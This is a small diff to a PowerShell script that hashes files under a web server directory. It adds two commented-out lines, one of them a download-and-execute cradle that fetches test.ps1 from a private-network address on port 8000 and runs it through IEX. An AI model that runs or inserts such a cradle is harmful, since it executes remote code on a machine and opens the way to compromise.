@@ -1,3 +1,6 @@
+#powershell -noexit "& ""C:\test.ps1"""
+#echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10:8000/test.ps1') | powershell -noprofile 
+
 # Generate SHA1 Hashes Recursively
 
 $Path= "C:\inetpub\wwwroot\"
